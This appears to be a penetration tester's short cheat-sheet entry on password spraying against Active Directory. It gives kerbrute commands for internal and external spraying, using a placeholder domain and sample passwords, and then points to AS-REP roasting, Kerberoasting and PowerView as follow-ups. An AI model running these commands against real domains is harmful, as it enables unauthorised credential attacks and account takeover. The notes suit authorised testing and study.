
### Internal password spraying
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

### External password spraying
```
kerbrute passwordspray -d corp.com --dc 192.168.199.70 userlist.txt "VimForPowerShell123!"
```

### If any username/password combination is found:
- Check [[AS-REP roasting]] with the valid credentials to see if other users are AS-REP-roastable.
- Check  for [[Kerberoasting]] with the valid credentials. If possible, check the user using `Get-NetUser -SPN` from `Powerview.ps1`.
